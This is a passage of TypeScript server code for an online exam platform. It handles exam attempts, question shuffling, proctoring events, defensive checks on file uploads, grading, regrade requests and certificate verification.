        const phoneNumber = decryptString(u.phone);
        if (phoneNumber) {
          try { await sendSms(phoneNumber, `Oriole: "${exam.title}" starts ${label} (${new Date(startIso).toLocaleString()}). Run your system check beforehand.`); } catch { /* best-effort */ }
        }
      }
      sent.push(tag);
      return true;
    };
    let changed = false;
    if (hoursUntil <= 1) changed = await fire("1h", "in under an hour");
    else if (hoursUntil <= 24) changed = await fire("24h", "within 24 hours");
    if (changed) { reg.remindersSent = sent; await db.upsert("registrations", reg); }
  }
}

/** Build the admin summary digest over the trailing `sinceMs`. Returns null if no activity. */
function buildDigest(sinceMs: number, periodLabel: string): { subject: string; text: string; html: string } | null {
  const since = new Date(sinceMs).toISOString();
  const examOf = (id: string) => db.data!.exams.find((e) => e.id === id);
  const newSubs = db.data!.attempts.filter((a) => a.status === "submitted" && (a.submittedAt ?? "") >= since && !examOf(a.examId)?.practice);
  const pendingGrading = db.data!.attempts.filter((a) => a.gradingStatus === "pending_review").length;
  const openAppeals = db.data!.regradeRequests.filter((r) => r.status === "open").length;
  const scores = newSubs.map((a) => a.score ?? 0);
  const avg = scores.length ? Math.round(scores.reduce((s, x) => s + x, 0) / scores.length) : null;
  const passed = newSubs.filter((a) => a.passed).length;
  const inProgress = db.data!.attempts.filter((a) => a.status === "in_progress").length;
  if (newSubs.length === 0 && pendingGrading === 0 && openAppeals === 0 && inProgress === 0) return null;
  const org = getSettings().name || "Oriole";
  const consoleUrl = `${env.appUrl}/dashboard`;
  const subject = `${org} ${periodLabel} digest — ${newSubs.length} new submission${newSubs.length === 1 ? "" : "s"}`;
  const text = [
    `${org} — ${periodLabel} summary`,
    ``,
    `New submissions: ${newSubs.length}${avg !== null ? ` (avg ${avg}%, ${passed} passed)` : ""}`,
    `In progress now: ${inProgress}`,
    `Awaiting grading: ${pendingGrading}`,
    `Open regrade requests: ${openAppeals}`,
    ``,
    `Sign in to your console for the full breakdown: ${consoleUrl}`,
    ``,
    `— ${org} Assess`,
  ].join("\n");

  const stat = (label: string, value: string | number, badge?: string) =>
    `<tr>
      <td style="padding:8px 0;border-bottom:1px solid #f0f0f0;font-size:13px;color:#6b7280">${label}</td>
      <td style="padding:8px 0;border-bottom:1px solid #f0f0f0;font-size:14px;font-weight:700;color:#111827;text-align:right">${value}${badge ? `<span style="margin-left:6px;font-size:11px;font-weight:600;color:#6b7280">${badge}</span>` : ""}</td>
    </tr>`;

  const html = buildHtml(
    `<p style="margin:0 0 6px;font-size:13px;color:#6b7280;text-transform:uppercase;letter-spacing:.5px">${periodLabel} summary</p>
     <p style="margin:0 0 20px;font-size:17px;font-weight:700;color:#111827">${esc(org)}</p>
     <table role="presentation" cellpadding="0" cellspacing="0" style="width:100%;border-top:1px solid #f0f0f0;margin-bottom:20px">
       ${stat("New submissions", newSubs.length, avg !== null ? `avg ${avg}% · ${passed} passed` : "")}
       ${stat("In progress now", inProgress)}
       ${stat("Awaiting grading", pendingGrading)}
       ${stat("Open regrade requests", openAppeals)}
     </table>
     ${ctaButton("Open admin console", consoleUrl)}`,
    "admin",
  );

  return { subject, text, html };
}

/** Email the summary digest to all admins. Returns the number emailed. */
async function sendAdminDigest(sinceMs: number, periodLabel: string): Promise<number> {
  const digest = buildDigest(sinceMs, periodLabel);
  if (!digest) return 0;
  const admins = db.data!.users.filter((u) => u.role === "admin");
  let sent = 0;
  for (const a of admins) {
    try { await sendMail(a.email, digest.subject, digest.text, digest.html); sent++; } catch { /* best-effort */ }
  }
  const s = getSettings();
  s.digestLastSentAt = now();
  await db.upsert("settings", s);
  return sent;
}

/** Periodic check: send the configured daily/weekly digest when one is due. */
async function digestSweep() {
  const s = getSettings();
  const freq = s.digestFrequency ?? "off";
  if (freq === "off") return;
  const periodMs = freq === "daily" ? 24 * 3_600_000 : 7 * 24 * 3_600_000;
  const last = s.digestLastSentAt ? new Date(s.digestLastSentAt).getTime() : 0;
  if (Date.now() - last < periodMs) return;
  await sendAdminDigest(Date.now() - periodMs, freq === "daily" ? "daily" : "weekly");
}

app.post("/api/attempts", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const { registrationId } = req.body ?? {};
  const reg = db.data!.registrations.find((r) => r.id === registrationId && r.candidateId === user.id);
  if (!reg) return res.status(404).json({ error: "Registration not found." });
  const exam = db.data!.exams.find((e) => e.id === reg.examId)!;

  // Safe Exam Browser: if this exam is bound to SEB, reject any session that
  // isn't a verified SEB request (this is the hard, OS-level lockdown gate).
  const seb = verifySeb(req, exam);
  if (!seb.ok) return res.status(403).json({ error: seb.reason, sebRequired: true, launchUrl: exam.lockdown?.sebLaunchUrl ?? null });

  // One sitting per registration: once an attempt is submitted, the exam can't
  // be retaken — not by reloading, not from a different browser/device. This is
  // the authoritative server-side guard (the client also redirects to results).
  // Practice exams are exempt so they can be re-attempted for self-study.
  if (!exam.practice) {
    const submitted = db.data!.attempts.find((a) => a.registrationId === reg.id && a.status === "submitted");
    if (submitted) {
      return res.status(409).json({ error: "You have already completed this exam. It cannot be retaken." });
    }
  }

  // Resume an in-progress attempt if one exists.
  let attempt =
    db.data!.attempts.find((a) => a.registrationId === reg.id && a.status === "in_progress") ?? null;

  if (!attempt) {
    // A candidate may only sit the exam once an admin has confirmed their registration.
    if (reg.approval !== "confirmed") {
      return res.status(403).json({ error: "Your registration is awaiting confirmation by an administrator." });
    }
    // Enforce the scheduled availability window for a fresh attempt.
    const nowMs = Date.now();
    const schedIso = scheduledStartIso(reg, exam);
    if (schedIso && nowMs < new Date(schedIso).getTime()) {
      return res.status(403).json({ error: "This exam is not open yet." });
    }
    if (exam.availableUntil && nowMs > new Date(exam.availableUntil).getTime()) {
      return res.status(403).json({ error: "This exam has closed." });
    }
    // 30-minute late rule: a candidate who hasn't started within the grace window
    // after the scheduled start is locked out and flagged "was 30 min late".
    if (schedIso && !exam.practice) {
      const lateCutoff = new Date(schedIso).getTime() + LATE_GRACE_MIN * 60_000;
      if (nowMs > lateCutoff) {
        reg.flaggedLate = true;
        reg.lateReason = `was ${LATE_GRACE_MIN} min late`;
        await db.upsert("registrations", reg);
        return res.status(403).json({
          error: `You can no longer start this exam — you were more than ${LATE_GRACE_MIN} minutes late. This has been recorded.`,
          lateFlag: true,
        });
      }
    }
    attempt = {
      id: nanoid(12),
      registrationId: reg.id,
      examId: exam.id,
      candidateId: user.id,
      startedAt: now(),
      submittedAt: null,
      durationMinutes: exam.durationMinutes,
      score: null,
      passed: null,
      status: "in_progress",
    };
    // Freeze a per-attempt question set + option order so every candidate gets a
    // different order (and optionally a different random subset of a pool).
    const pool = db.data!.questions.filter((q) => q.examId === exam.id);
    const shuf = exam.shuffleQuestions !== false;
    let ids: string[];
    if (exam.blueprint?.length) {
      // Blueprint assembly: draw N questions per topic tag (case-insensitive).
      ids = [];
      for (const bp of exam.blueprint) {
        const tagged = pool.filter((q) => (q.tags ?? []).some((t) => t.toLowerCase() === bp.tag.toLowerCase())).map((q) => q.id);
        const drawn = shuf ? shuffle(tagged, Math.random) : tagged;
        ids.push(...(bp.count > 0 ? drawn.slice(0, bp.count) : drawn));
      }
      ids = [...new Set(ids)]; // a question may carry two blueprint tags
    } else if (exam.sections?.length) {
      // Keep sections in their defined order; shuffle within each, and draw a
      // random subset per section when that section is configured as a pool.
      ids = [];
      const buckets: { id: string | null; draw?: number }[] = [...exam.sections.map((sct) => ({ id: sct.id, draw: sct.drawCount })), { id: null }];
      for (const b of buckets) {
        let inSec = pool.filter((q) => (q.sectionId ?? null) === b.id).map((q) => q.id);
        inSec = shuf ? shuffle(inSec, Math.random) : inSec;
        if (b.draw && b.draw > 0 && b.draw < inSec.length) inSec = inSec.slice(0, b.draw);
        ids.push(...inSec);
      }
      if (exam.questionsPerAttempt && exam.questionsPerAttempt > 0 && exam.questionsPerAttempt < ids.length) {
        ids = ids.slice(0, exam.questionsPerAttempt);
      }
    } else {
      ids = chooseQuestionIds(pool.map((q) => q.id), exam.questionsPerAttempt, shuf, Math.random);
    }
    const byId = new Map(pool.map((q) => [q.id, q] as const));
    const optionOrders: Record<string, string[]> = {};
    for (const id of ids) {
      const q = byId.get(id);
      if (!q) continue;
      // The "options" to freeze depend on type: choices use q.options; matching
      // freezes the right-hand values; ordering freezes the items (always shuffled
      // so the correct sequence is never revealed by the served order).
      const opts = q.type === "matching" ? (q.matchPairs ?? []).map((p) => p.right)
        : q.type === "ordering" ? (q.sequence ?? [])
        : q.options;
      if (opts?.length) {
        const doShuffle = exam.shuffleOptions !== false || q.type === "ordering";
        optionOrders[id] = doShuffle ? shuffle(opts, Math.random) : [...opts];
      }
    }
    // Freeze random variable values for parameterized questions, so the candidate
    // sees the same numbers on resume and grading uses exactly those values.
    const paramValues: Record<string, Record<string, number>> = {};
    for (const id of ids) {
      const q = byId.get(id);
      if (!q || q.type !== "parameterized" || !q.paramVariables?.length) continue;
      const vars: Record<string, number> = {};
      for (const pv of q.paramVariables) {
        const lo = Math.min(pv.min, pv.max), hi = Math.max(pv.min, pv.max);
        const f = Math.pow(10, Math.max(0, pv.decimals | 0));
        vars[pv.name] = Math.round((Math.random() * (hi - lo) + lo) * f) / f;
      }
      paramValues[id] = vars;
    }
    attempt.questionIds = ids;
    attempt.optionOrders = optionOrders;
    attempt.paramValues = paramValues;
    db.data!.attempts.push(attempt);
    reg.status = "in_progress";
    await db.upsert("attempts", attempt);
    await db.upsert("registrations", reg);
  }

  // Study streak: sitting an exam or practice test counts as studying today.
  const sd = nextStreak(user.lastActiveDay, user.streak, Date.now());
  if (sd.changed) {
    user.streak = sd.streak;
    user.lastActiveDay = sd.day;
    await db.upsert("users", user);
  }

  const questions = servedPublicQuestions(attempt!);

  const existingAnswers = (await answerStore.forAttempt(attempt!.id))
    .map((a) => ({ questionId: a.questionId, value: a.value }));

  res.json({ attempt, exam, questions, answers: existingAnswers, deadlineAt: new Date(attemptDeadlineMs(attempt!)).toISOString(), serverNow: now(), codeRunner: codeRunnerEnabled() });
});

// Code execution is OFF by default — the Run/Test buttons stay hidden until an
// admin provisions a runner and sets CODE_RUNNER_ENABLED=1 (no redeploy needed).
function codeRunnerEnabled(): boolean {
  return process.env.CODE_RUNNER_ENABLED === "1";
}

// Run a snippet of candidate code against optional stdin, via the external runner.
// Used by `code` questions (the Monaco editor's Run / Test buttons).
app.post("/api/code/run", requireAuth, async (req, res) => {
  if (!codeRunnerEnabled()) return res.status(503).json({ error: "Code running is disabled." });
  const { language, code, stdin } = req.body ?? {};
  if (!CODE_LANGUAGES.includes(language)) return res.status(400).json({ error: "Unsupported language." });
  if (typeof code !== "string" || !code.trim()) return res.status(400).json({ error: "Nothing to run." });
  if (code.length > 50_000) return res.status(413).json({ error: "Code is too long to run." });
  try {
    const result = await runCode(language, code, typeof stdin === "string" ? stdin : "");
    res.json(result);
  } catch {
    res.status(502).json({ error: "The code runner is unavailable right now. Your answer is still saved." });
  }
});

app.get("/api/attempts/:id", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const attempt = db.data!.attempts.find((a) => a.id === req.params.id && a.candidateId === user.id);
  if (!attempt) return res.status(404).json({ error: "Attempt not found." });
  const exam = db.data!.exams.find((e) => e.id === attempt.examId)!;
  const seb = verifySeb(req, exam);
  if (!seb.ok) return res.status(403).json({ error: seb.reason, sebRequired: true, launchUrl: exam.lockdown?.sebLaunchUrl ?? null });
  const questions = servedPublicQuestions(attempt);
  const answers = (await answerStore.forAttempt(attempt.id))
    .map((a) => ({ questionId: a.questionId, value: a.value }));
  res.json({ attempt, exam, questions, answers, deadlineAt: new Date(attemptDeadlineMs(attempt)).toISOString(), serverNow: now(), codeRunner: codeRunnerEnabled() });
});

// Lightweight control channel the candidate's exam polls for live proctor actions.
app.get("/api/attempts/:id/control", requireAuth, (req, res) => {
  const user = currentUser(req)!;
  const attempt = db.data!.attempts.find((a) => a.id === req.params.id && a.candidateId === user.id);
  if (!attempt) return res.status(404).json({ error: "Attempt not found." });
  res.json({
    paused: !!attempt.paused,
    terminated: !!attempt.terminated || attempt.status === "submitted",
    terminationReason: attempt.terminationReason ?? null,
    messages: attempt.proctorMessages ?? [],
    deadlineAt: new Date(attemptDeadlineMs(attempt)).toISOString(),
    serverNow: now(),
  });
});

// Allowlist of file-upload answer MIME types. Excludes HTML/SVG/scripts/executables
// so a grader who downloads a submission can't be served something that executes.
const ALLOWED_UPLOAD_TYPES = new Set([
  "application/pdf", "text/plain", "text/csv", "application/zip",
  "image/png", "image/jpeg", "image/gif", "image/webp",
  "application/msword", "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  "application/vnd.ms-excel", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  "application/vnd.ms-powerpoint", "application/vnd.openxmlformats-officedocument.presentationml.presentation",
]);
// Optional cloud malware scan (Cloudmersive Virus Scan API) for file-upload
// answers. Off by default — only runs when CLOUDMERSIVE_API_KEY is set, same
// opt-in pattern as the code runner / SMS provider. Fails OPEN: if the service
// is unreachable, times out, or errors, the upload is allowed through (logged,
// not surfaced to the candidate) rather than blocking a legitimate exam
// submission over a transient AV-provider outage — the MIME allowlist and
// content-sniff above already block the most common attack vectors on their
// own, so this is a defense-in-depth layer, not the only line of defense.
async function scanForMalware(buf: Buffer): Promise<{ clean: boolean; reason?: string }> {
  const apiKey = process.env.CLOUDMERSIVE_API_KEY;
  if (!apiKey) return { clean: true };
  try {
    const form = new FormData();
    form.append("inputFile", new Blob([new Uint8Array(buf)]), "upload");
    const res = await fetch("https://api.cloudmersive.com/virus/scan/file", {
      method: "POST",
      headers: { Apikey: apiKey },
      body: form,
      signal: AbortSignal.timeout(15000),
    });
    if (!res.ok) { logger.warn({ status: res.status }, "AV scan request failed — allowing upload through"); return { clean: true }; }
    const result = (await res.json()) as { CleanResult?: boolean };
    if (result.CleanResult === false) return { clean: false, reason: "This file was flagged by malware scanning and can't be accepted." };
    return { clean: true };
  } catch (e) {
    logger.warn({ err: e }, "AV scan errored — allowing upload through");
    return { clean: true };
  }
}

async function validateUploadAnswer(value: string): Promise<{ ok: boolean; reason?: string }> {
  let meta: { type?: string; data?: string };
  try { meta = JSON.parse(value); } catch { return { ok: false, reason: "Invalid file upload." }; }
  const data = typeof meta?.data === "string" ? meta.data : "";
  if (!data.startsWith("data:")) return { ok: false, reason: "Invalid file upload." };
  if (data.length > 2_500_000) return { ok: false, reason: "File is too large." };
  const type = String(meta.type ?? "").toLowerCase().split(";")[0].trim();
  if (!ALLOWED_UPLOAD_TYPES.has(type)) return { ok: false, reason: "That file type isn't allowed. Use PDF, an image (PNG/JPG/GIF/WebP), text/CSV, an Office document, or a ZIP." };
  // Defence against a spoofed type: sniff the decoded head for markup/script.
  let head = "";
  try { head = Buffer.from(data.slice(data.indexOf(",") + 1, data.indexOf(",") + 200), "base64").toString("utf8").trim().toLowerCase(); } catch { /* binary — fine */ }
  if (/^(<!doctype|<html|<svg|<\?xml|<script)/.test(head)) return { ok: false, reason: "That file looks like markup or a script and isn't allowed." };
  try {
    const raw = Buffer.from(data.slice(data.indexOf(",") + 1), "base64");
    const scan = await scanForMalware(raw);
    if (!scan.clean) return { ok: false, reason: scan.reason };
  } catch { /* decode failure shouldn't block — already validated as a data: URL above */ }
  return { ok: true };
}

app.post("/api/attempts/:id/answer", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const attempt = db.data!.attempts.find((a) => a.id === req.params.id && a.candidateId === user.id);
  if (!attempt) return res.status(404).json({ error: "Attempt not found." });
  if (attempt.status !== "in_progress") return res.status(409).json({ error: "Attempt already submitted." });
  const examForAnswer = db.data!.exams.find((e) => e.id === attempt.examId);
  const sebAns = verifySeb(req, examForAnswer);
  if (!sebAns.ok) return res.status(403).json({ error: sebAns.reason, sebRequired: true });
  // Hard close: no answers accepted once the server-side deadline has passed.
  if (Date.now() > attemptDeadlineMs(attempt)) return res.status(409).json({ error: "Time is up — this exam has closed." });
  const { questionId, value } = req.body ?? {};
  const question = servedQuestions(attempt).find((q) => q.id === questionId);
  if (!question) return res.status(400).json({ error: "Invalid question." });
  if (question.type === "file_upload" && value) {
    const v = await validateUploadAnswer(String(value));
    if (!v.ok) return res.status(400).json({ error: v.reason });
  }

  let answer = await answerStore.forAttemptQuestion(attempt.id, questionId);
  if (answer) {
    answer.value = String(value ?? "");
  } else {
    answer = { id: nanoid(10), attemptId: attempt.id, questionId, value: String(value ?? ""), correct: null };
  }
  await answerStore.upsert(answer);
  res.json({ ok: true });
});

app.post("/api/attempts/:id/proctor-event", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const attempt = db.data!.attempts.find((a) => a.id === req.params.id && a.candidateId === user.id);
  if (!attempt) return res.status(404).json({ error: "Attempt not found." });
  // Once the attempt is submitted the exam is over — ignore any late flags. This
  // stops teardown artefacts (e.g. the app's own exitFullscreen on submit, or a
  // beacon that arrives after finishing) from being recorded as violations.
  if (attempt.status === "submitted") return res.json({ ok: true, ignored: "submitted" });
  const { type, severity, message } = req.body ?? {};
  // This payload is candidate-controlled, so validate it against the known event
  // vocabulary: an unrecognised `type` is rejected (a tampered client can't inject
  // arbitrary strings into the proctoring timeline), the severity is clamped to the
  // known set (an unknown value would score as 0 and could hide a real flag), and
  // the free-text message is length-capped so it can't bloat stored data.
  if (!(PROCTOR_EVENT_TYPES as readonly string[]).includes(type)) {
    return res.status(400).json({ error: "Unknown event type." });
  }
  const safeSeverity: ProctorEvent["severity"] =
    severity === "warning" || severity === "high" ? severity : "info";
  const event: ProctorEvent = {
    id: nanoid(10),
    attemptId: attempt.id,
    type,
    severity: safeSeverity,
    message: String(message ?? "").slice(0, 500),
    at: now(),
  };
  await proctorStore.add(event);

  // Server-side violation enforcement — independent of the client's own
  // escalation (which a tampered client could skip). For proctored exams, once
  // the recorded flags reach the exam's configured limit, end the exam here so
  // it can't be bypassed in the browser. Mirrors the client threshold exactly.
  const exam = db.data!.exams.find((e) => e.id === attempt.examId);
  if (exam?.proctored && event.severity !== "info") {
    const limit = exam.lockdown?.violationLimit ?? 0;
    const flags = flaggedCount(cleanEvents(await proctorStore.forAttempt(attempt.id), attempt.submittedAt));
    const threshold = limit <= 0 ? 1 : limit; // limit 0 = zero tolerance (first flag ends it)
    if (flags >= threshold) {
      const reason = limit <= 0
        ? "Auto-submitted: zero-tolerance integrity policy — a violation was detected."
        : `Auto-submitted: reached the integrity-violation limit (${flags}/${limit}).`;
      await forceSubmitAttempt(attempt, reason);
      return res.json({ ok: true, autoSubmitted: true });
    }
  }
  res.json({ ok: true });
});

app.post("/api/attempts/:id/snapshot", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const attempt = db.data!.attempts.find((a) => a.id === req.params.id && a.candidateId === user.id);
  if (!attempt) return res.status(404).json({ error: "Attempt not found." });
  const image = req.body?.image;
  if (typeof image !== "string" || !image.startsWith("data:image/") || image.length > 300_000) {
    return res.status(400).json({ error: "Invalid snapshot." });
  }
  // Keep a rolling timeline of frames per attempt (capped so storage stays bounded).
  const SNAPSHOT_CAP = 24;
  const frame = { id: nanoid(12), attemptId: attempt.id, dataUrl: encryptString(image), at: now() };
  await snapshotStore.add(frame);
  await snapshotStore.trim(attempt.id, SNAPSHOT_CAP);
  res.json({ ok: true });
});

/** Recompute an attempt's score/passed from the points currently awarded on its answers. */
function recomputeAttempt(attempt: Attempt, answers: Answer[]) {
  const exam = db.data!.exams.find((e) => e.id === attempt.examId)!;
  const questions = servedQuestions(attempt);
  const totalPoints = questions.reduce((s, q) => s + q.points, 0) || 1;
  let earned = 0;
  for (const q of questions) {
    const ans = answers.find((a) => a.questionId === q.id);
    // Allow negative awards (negative marking); bound each to ±points.
    earned += Math.max(-q.points, Math.min(q.points, ans?.awardedPoints ?? 0));
  }
  // Negative marking can push the raw total below zero — the reported score floors at 0.
  const raw = Math.max(0, Math.round((earned / totalPoints) * 100));
  // Apply the exam's grade curve (if any). Pass/fail and the final score use the curved value;
  // the raw value is preserved for transparency.
  const score = applyCurve(raw, exam.gradeScale);
  attempt.rawScore = raw;
  attempt.score = score;
  attempt.passed = score >= exam.passingScore;
  return { score, passed: attempt.passed, exam };
}

/** For a parameterized question, return a copy whose `correctAnswer` is computed
 *  from this attempt's frozen variable values (rounded to remove FP noise);
 *  any other question is returned unchanged. Used for grading and review display. */
function paramComputed(q: Question, attempt: Attempt): Question {
  if (q.type !== "parameterized" || !q.paramFormula) return q;
  const vals = attempt.paramValues?.[q.id];
  if (!vals) return q;
  const computed = tryEvalExpr(q.paramFormula, vals);
  if (computed == null) return { ...q, correctAnswer: "" };
  return { ...q, correctAnswer: String(Math.round(computed * 1e6) / 1e6) };
}

/** The question as a given attempt saw it: parameterized prompts get this attempt's
 *  values substituted and its correct answer computed; all other questions pass through. */
function attemptQuestion(q: Question, attempt: Attempt): Question {
  if (q.type !== "parameterized") return q;
  const vals = attempt.paramValues?.[q.id];
  const withAnswer = paramComputed(q, attempt);
  return { ...withAnswer, prompt: vals ? substituteParams(q.prompt, vals) : q.prompt };
}

/**
 * Auto-grade an attempt on submission. Objective questions (mcq/true_false) and
 * short answers that match an accepted answer are graded immediately. Short
 * answers that don't match are awarded 0 provisionally and flagged for a human
 * grade — the attempt then sits in "pending_review" until a grader releases it.
 */
function gradeAttempt(attempt: Attempt, answers: Answer[]) {
  const questions = servedQuestions(attempt);
  const gExam = db.data!.exams.find((e) => e.id === attempt.examId);
  const markOpts = { negativeMarking: gExam?.negativeMarking ?? 0, partialCredit: gExam?.partialCredit ?? false };
  let needsReview = false;
  for (const q of questions) {
    const ans = answers.find((a) => a.questionId === q.id);
    // If the question was edited after this attempt started, its answer is voided:
    // recorded blank, scores 0, and is not sent for manual review.
    if (q.updatedAt && q.updatedAt > attempt.startedAt) {
      if (ans) {
        ans.value = "";
        ans.awardedPoints = 0;
        ans.correct = false;
        ans.needsReview = false;
        ans.gradedBy = "auto";
      }
      continue;
    }
    const r = gradeOne(paramComputed(q, attempt), ans?.value, markOpts);
    if (r.needsReview) needsReview = true;
    if (ans) {
      ans.awardedPoints = r.awarded;
      ans.correct = r.correct;
      ans.needsReview = r.needsReview;
      ans.gradedBy = r.needsReview ? null : "auto";
    }
  }

  attempt.status = "submitted";
  attempt.submittedAt = now();
  attempt.gradingStatus = needsReview ? "pending_review" : "auto_graded";
  attempt.releasedAt = needsReview ? null : now();
  const { score, passed, exam } = recomputeAttempt(attempt, answers);
  dispatchWebhook("attempt.submitted", { attemptId: attempt.id, examId: attempt.examId, candidateId: attempt.candidateId, score, passed, gradingStatus: attempt.gradingStatus });
  return { score, passed, exam, needsReview };
}

/** Issue a certificate for a passed attempt if one doesn't already exist. */
function issueCertificate(attempt: Attempt): Certificate | null {
  if (!attempt.passed) return null;
  const exam = db.data!.exams.find((e) => e.id === attempt.examId);
  if (exam?.practice) return null; // practice attempts never earn certificates
  const existing = db.data!.certificates.find((c) => c.attemptId === attempt.id);
  if (existing) return existing;
  const cert: Certificate = {
    id: nanoid(12),
    certNumber: "CERT-" + nanoid(8).toUpperCase(),
    attemptId: attempt.id,
    candidateId: attempt.candidateId,
    examId: attempt.examId,
    score: attempt.score!,
    issuedAt: now(),
  };
  db.data!.certificates.push(cert);
  dispatchWebhook("certificate.issued", { certNumber: cert.certNumber, candidateId: cert.candidateId, examId: cert.examId, score: cert.score });
  return cert;
}

/**
 * Finalize an in-progress attempt: grade it, mark it submitted + terminated,
 * issue a certificate if earned, persist, and notify. No-op if already
 * submitted. Shared by the proctor "terminate" action and the server-side
 * violation enforcement so both end an exam identically. Returns true if it
 * actually finalized the attempt.
 */
async function forceSubmitAttempt(a: Attempt, reason: string): Promise<boolean> {
  if (a.status === "submitted") return false;
  const answers = await answerStore.forAttempt(a.id);
  a.paused = false; a.pausedAt = null;
  const { needsReview, passed } = gradeAttempt(a, answers);
  a.terminated = true;
  a.terminationReason = reason;
  const reg = db.data!.registrations.find((r) => r.id === a.registrationId);
  if (reg) reg.status = "submitted";
  const certificate = needsReview ? null : (passed ? issueCertificate(a) : null);
  for (const ans of answers) await answerStore.upsert(ans);
  await db.upsert("attempts", a);
  if (reg) await db.upsert("registrations", reg);
  if (certificate) await db.upsert("certificates", certificate);
  if (!needsReview) void notifyResultReleased(a);
  return true;
}

app.post("/api/attempts/:id/submit", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const attempt = db.data!.attempts.find((a) => a.id === req.params.id && a.candidateId === user.id);
  if (!attempt) return res.status(404).json({ error: "Attempt not found." });
  if (attempt.status === "submitted") {
    return res.json({ attempt });
  }
  const examForSubmit = db.data!.exams.find((e) => e.id === attempt.examId);
  const sebSub = verifySeb(req, examForSubmit);
  if (!sebSub.ok) return res.status(403).json({ error: sebSub.reason, sebRequired: true });
  const answers = await answerStore.forAttempt(attempt.id);
  const { passed, needsReview } = gradeAttempt(attempt, answers);

  const reg = db.data!.registrations.find((r) => r.id === attempt.registrationId);
  if (reg) reg.status = "submitted";

  // Certificate is only issued once the result is final. When short answers
  // await a human grade, it's deferred until the grader releases the result.
  const certificate = needsReview ? null : (passed ? issueCertificate(attempt) : null);
  // Persist only the rows this submission touched (graded answers + attempt + reg + cert).
  for (const ans of answers) await answerStore.upsert(ans);
  await db.upsert("attempts", attempt);
  if (reg) await db.upsert("registrations", reg);
  if (certificate) await db.upsert("certificates", certificate);
  // Auto-graded results are available immediately → notify. Pending-review
  // results are emailed later, when a grader releases them.
  if (!needsReview) void notifyResultReleased(attempt);
  res.json({ attempt, certificate, pendingReview: needsReview });
});

// ---------------------------------------------------------------- RESULTS
app.get("/api/attempts/:id/result", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const attempt = db.data!.attempts.find((a) => a.id === req.params.id && a.candidateId === user.id);
  if (!attempt) return res.status(404).json({ error: "Attempt not found." });
  const exam = db.data!.exams.find((e) => e.id === attempt.examId)!;
  const pendingReview = attempt.gradingStatus === "pending_review";
  // Scheduled release: hold the score from the student until the release time.
  const held = !!exam.resultsReleaseAt && new Date(exam.resultsReleaseAt).getTime() > Date.now();
  const hide = pendingReview || held; // don't reveal marks/answers yet
  const questions = servedQuestions(attempt);
  const answers = await answerStore.forAttempt(attempt.id);
  const review = questions.map((rawQ) => {
    const q = attemptQuestion(rawQ, attempt);
    const ans = answers.find((a) => a.questionId === q.id);
    return {
      questionId: q.id,
      prompt: q.prompt,
      type: q.type,
      yourAnswer: displayAnswer(q, ans?.value),
      // While a result is pending review or held for scheduled release, don't reveal correct answers or marks yet.
      correctAnswer: hide ? "" : displayCorrect(q),
      correct: hide ? null : (ans?.correct ?? false),
      awardedPoints: hide ? null : (ans?.awardedPoints ?? 0),
      needsReview: ans?.needsReview ?? false,
      feedback: hide ? null : (ans?.feedback ?? null),
      rubric: q.rubric ?? null,
      rubricScores: hide ? null : (ans?.rubricScores ?? null),
      explanation: hide ? null : (q.explanation ?? null),
      points: q.points,
    };
  });
  const certificate = db.data!.certificates.find((c) => c.attemptId === attempt.id) ?? null;
  const events = cleanEvents(await proctorStore.forAttempt(attempt.id), attempt.submittedAt);
  // When held, blank the score so the client can't read it from the attempt object.
  const safeAttempt = held ? { ...attempt, score: null, rawScore: null, passed: null } : attempt;
  const myRegrade = db.data!.regradeRequests.find((r) => r.attemptId === attempt.id) ?? null;
  res.json({
    attempt: safeAttempt, exam, review, certificate, proctorEvents: events,
    gradingStatus: attempt.gradingStatus ?? "auto_graded",
    held, releaseAt: held ? exam.resultsReleaseAt : null,
    letter: hide ? null : letterFor(attempt.score ?? 0, exam.gradeBands),
    // Whether this released result can be appealed, and the status of any existing appeal.
    canAppeal: !hide && attempt.status === "submitted",
    regrade: myRegrade ? { status: myRegrade.status, reason: myRegrade.reason, response: myRegrade.response ?? null, createdAt: myRegrade.createdAt } : null,
  });
});

// Candidate: request a review (appeal) of a released result.
app.post("/api/attempts/:id/regrade", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const attempt = db.data!.attempts.find((a) => a.id === req.params.id && a.candidateId === user.id);
  if (!attempt) return res.status(404).json({ error: "Attempt not found." });
  const exam = db.data!.exams.find((e) => e.id === attempt.examId);
  const held = !!exam?.resultsReleaseAt && new Date(exam.resultsReleaseAt).getTime() > Date.now();
  if (attempt.gradingStatus === "pending_review" || held) return res.status(409).json({ error: "Results aren't available yet." });
  const reason = String(req.body?.reason ?? "").trim();
  if (reason.length < 10) return res.status(400).json({ error: "Please give a reason (at least 10 characters)." });
  const existing = db.data!.regradeRequests.find((r) => r.attemptId === attempt.id && r.status === "open");
  if (existing) return res.status(409).json({ error: "You already have an open review request for this result." });
  const reqRow: RegradeRequest = {
    id: nanoid(10), attemptId: attempt.id, candidateId: user.id, examId: attempt.examId,
    reason: reason.slice(0, 2000), status: "open", scoreBefore: attempt.score ?? null, createdAt: now(),
  };
  db.data!.regradeRequests.push(reqRow);
  await db.upsert("regradeRequests", reqRow);
  res.json({ regrade: { status: reqRow.status, reason: reqRow.reason, response: null, createdAt: reqRow.createdAt } });
});

// ---------------------------------------------------------------- CERTIFICATES
app.get("/api/certificates", requireAuth, (req, res) => {
  const user = currentUser(req)!;
  const certs = db.data!.certificates
    .filter((c) => c.candidateId === user.id)
    .map((c) => ({ ...c, exam: db.data!.exams.find((e) => e.id === c.examId) }));
  res.json({ certificates: certs });
});

// Public — no auth (employers verify here).
app.get("/api/verify/:certNumber", (req, res) => {
  const cert = db.data!.certificates.find(
    (c) => c.certNumber.toLowerCase() === req.params.certNumber.toLowerCase(),
  );
  if (!cert) return res.json({ valid: false });
  const exam = db.data!.exams.find((e) => e.id === cert.examId);
  const holder = db.data!.users.find((u) => u.id === cert.candidateId);
  res.json({
    valid: true,
    certificate: {
      certNumber: cert.certNumber,
      score: cert.score,
      issuedAt: cert.issuedAt,
      examTitle: exam?.title ?? "Examination",
      holderName: holder?.name ?? "Candidate",
    },
  });
});

